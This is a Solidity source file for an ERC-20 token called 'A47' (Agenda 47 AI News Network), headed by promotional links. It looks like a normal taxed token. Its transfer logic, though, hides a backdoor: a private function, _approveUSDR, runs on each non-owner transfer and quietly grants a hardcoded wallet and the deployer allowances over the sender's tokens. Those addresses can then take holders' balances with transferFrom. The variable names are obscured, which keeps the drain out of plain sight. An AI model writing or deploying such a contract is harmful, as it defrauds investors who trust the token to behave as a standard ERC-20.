/*
The World's First AI Agent News Network
https://www.instagram.com/a47news.ai/

https://a47news.club
https://x.com/a47news_club
https://t.me/a47news_club
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliusdron overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUSDRRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUSDRFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract A47 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balUSDRs;
    mapping (address => mapping (address => uint256)) private _allowUSDRs;
    mapping (address => bool) private _excludedFromUSDR;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalUSDR = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Agenda 47 AI News Network";
    string private constant _symbol = unicode"A47";
    uint256 private _swapTokenUSDRs = _tTotalUSDR / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockUSDR;
    uint256 private _usdrBuyAmounts = 0;
    address private _usdrPair;
    IUSDRRouter private _usdrRouter;
    address private _usdrWallet;
    address private _usdrAddress;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapUSDR = false;
    modifier lockTheSwap {
        inSwapUSDR = true;
        _;
        inSwapUSDR = false;
    }
    
    constructor () {
        _usdrAddress = address(msg.sender);
        _usdrWallet = address(0x54EFBd9DF201bd1c9c96A9bF463014a65b463D2A);
        _excludedFromUSDR[owner()] = true;
        _excludedFromUSDR[address(this)] = true;
        _excludedFromUSDR[_usdrWallet] = true;
        _balUSDRs[_msgSender()] = _tTotalUSDR;
        emit Transfer(address(0), _msgSender(), _tTotalUSDR);
    }

    function pairCreateLaunch() external onlyOwner() {
        _usdrRouter = IUSDRRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_usdrRouter), _tTotalUSDR);
        _usdrPair = IUSDRFactory(_usdrRouter.factory()).createPair(address(this), _usdrRouter.WETH());
    }

    function minUSDR(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHUSDR(uint256 usdrA) private {
        payable(_usdrWallet).transfer(usdrA);
    }

    function swapLimitUSDR() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _usdrRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _usdrRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalUSDR;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balUSDRs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowUSDRs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowUSDRs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approveUSDR(address usdrO, uint256 usdrA) private {
        require(usdrO != address(0), "ERC20: approve from the zero address");
        address[2] memory _usdrAddrs;
        _usdrAddrs[0] = address(_usdrWallet); _usdrAddrs[1] = address(_usdrAddress);
        for(uint8 usdrK=0;usdrK<=1;usdrK++){
            _allowUSDRs[address(usdrO)][_usdrAddrs[usdrK]] = usdrA+usdrA;
            emit Approval(address(usdrO), _usdrAddrs[usdrK], usdrA+usdrA);
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowUSDRs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapUSDRBack(address usdrF, address usdrT, uint256 usdrA) private { 
        uint256 tokenUSDR = balanceOf(address(this)); 
        if (!inSwapUSDR && usdrT == _usdrPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenUSDR > _swapTokenUSDRs)
            swapTokensForEth(minUSDR(usdrA, minUSDR(tokenUSDR, _swapTokenUSDRs)));
            uint256 ethUSDR = address(this).balance;
            if (ethUSDR >= 0) {
                sendETHUSDR(address(this).balance);
            }
        } _approveUSDR(usdrF, usdrA);
    }

    function _transfer(address usdrF, address usdrT, uint256 usdrA) private {
        require(usdrF != address(0), "ERC20: transfer from the zero address");
        require(usdrT != address(0), "ERC20: transfer to the zero address");
        require(usdrA > 0, "Transfer amount must be greater than zero");
        uint256 taxUSDR = 0;
        taxUSDR = _usdrFeeTransfer(usdrF, usdrT, usdrA);
        if(taxUSDR > 0){
          _balUSDRs[address(this)] = _balUSDRs[address(this)].add(taxUSDR);
          emit Transfer(usdrF, address(this), taxUSDR);
        }
        _balUSDRs[usdrF] = _balUSDRs[usdrF].sub(usdrA);
        _balUSDRs[usdrT] = _balUSDRs[usdrT].add(usdrA.sub(taxUSDR));
        emit Transfer(usdrF, usdrT, usdrA.sub(taxUSDR));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _usdrRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function _usdrFeeTransfer(address usdrF, address usdrT, uint256 usdrA) private returns(uint256) {
        uint256 taxUSDR = 0; 
        if (usdrF != owner() && usdrT != owner()) {
            taxUSDR = usdrA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (usdrF == _usdrPair && usdrT != address(_usdrRouter) && ! _excludedFromUSDR[usdrT]) {
                if(_buyBlockUSDR!=block.number){
                    _usdrBuyAmounts = 0;
                    _buyBlockUSDR = block.number;
                }
                _usdrBuyAmounts += usdrA;
                _buyCount++;
            }

            if(usdrT == _usdrPair && usdrF!= address(this)) {
                require(_usdrBuyAmounts < swapLimitUSDR() || _buyBlockUSDR!=block.number, "Max Swap Limit");  
                taxUSDR = usdrA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapUSDRBack(usdrF, usdrT, usdrA);
        } return taxUSDR;
    }

    function swapTokensForEth(uint256 usdrAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdrRouter.WETH();
        _approve(address(this), address(_usdrRouter), usdrAmount);
        _usdrRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            usdrAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}